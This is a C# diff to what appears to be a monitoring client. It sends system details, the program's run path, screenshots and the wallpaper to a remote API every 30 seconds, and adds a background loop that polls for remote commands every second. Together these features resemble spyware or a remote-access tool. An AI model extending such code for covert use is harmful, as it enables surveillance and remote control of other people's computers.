@@ -18,10 +18,9 @@ public class Program
 {
     static async Task Main()
     {
+        Task.Run(() => RunConcurrently());
         while (true)
         {
-            Console.WriteLine("t");
-
             try
             {
                 var monitoredData = new
@@ -43,6 +42,7 @@ public class Program
                     is64BitOS = Environment.Is64BitOperatingSystem, 
                     ramUsage = Process.GetCurrentProcess().PrivateMemorySize64,
                     timeOfMonitoring = DateTime.Now.ToString("HH:mm:ss - MM/dd/yyyy"),
+                    runPath = System.Reflection.Assembly.GetExecutingAssembly().Location,
                 };
                 await APIHandler.SendMonitoredDataAsync(monitoredData, ScreenshotCapture.GetScreenshotPath(), ScreenshotCapture.GetCurrentWallpaper());
             }
@@ -51,11 +51,17 @@ public class Program
                 Console.WriteLine($"Error the: {ex.Message}");
             }
             Thread.Sleep(30000);
-            await APIHandler.checkforRemoteCommands();
         }
 
     }
-
+    static void RunConcurrently()
+    {
+        while (true)
+        {
+            APIHandler.checkforRemoteCommands();
+            Thread.Sleep(1000);
+        }
+    }
     public static string GetLocalIPAddress()
     {
         var host = Dns.GetHostEntry(Dns.GetHostName());
